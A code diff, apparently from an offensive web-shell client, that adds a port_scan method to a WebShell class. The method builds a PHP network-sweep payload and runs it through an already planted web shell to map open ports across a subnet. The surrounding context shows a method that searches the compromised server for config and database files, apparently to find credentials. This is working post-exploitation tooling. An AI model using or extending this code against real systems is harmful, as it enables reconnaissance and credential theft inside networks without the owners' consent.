@@ -112,6 +112,15 @@ class WebShell():
         else:
             Log.error("Error occured! %s" % output[1])
 
+    def port_scan(self, hosts, ports):
+        Log.info("Starting port scan... %s => [%s]" % (hosts, ports))
+        code = "set_time_limit(0);error_reporting(0);$ports_input='%s';$hosts_input='%s';$timeout=0.5;$ports=explode(',', $ports_input);$hosts_array=explode('/', $hosts_input);$ip=ip2long($hosts_array[0]);$net_mask=intval($hosts_array[1]);$range=pow(2, (32 - $net_mask));$start=$ip >> (32 - $net_mask) << (32 - $net_mask);for ($i=0;$i < $range;$i++) {$h=long2ip($start + $i);foreach ($ports as $p) {$c=@fsockopen($h, intval($p), $en, $es, $timeout);if (is_resource($c)) {echo $h.':'.$p.' => open\n';fclose($c);} else {echo $h.':'.$p.' => '.$es.'\n';}ob_flush();flush();}}" % (ports, hosts)
+        Log.info("Executing : \n%s" % code)
+        result = self.php_code_exec_token(code)
+        if result[0]:
+            Log.success("Result : \n%s" % (result[1]))
+        else:
+            Log.error("Error occured! %s" % result[1])
 
     def get_config_file(self):
         keywords = ["config", "db", "database"]
